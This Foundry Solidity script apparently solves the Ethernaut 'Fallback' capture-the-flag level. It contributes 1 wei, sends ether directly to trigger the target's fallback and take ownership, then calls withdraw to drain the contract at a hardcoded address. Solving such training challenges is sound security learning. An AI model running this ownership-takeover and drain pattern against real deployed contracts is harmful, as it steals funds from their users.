//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(0x95035632b756725eB24FB855C2660Cf02ac7355F));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackInstance.contribute{value: 1 wei}();
        (bool success,) = address(fallbackInstance).call{value: 1 wei}("");
        require(success);
        console.log("Owner address: ", fallbackInstance.owner());
        console.log("My address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();
        vm.stopBroadcast();
    }
}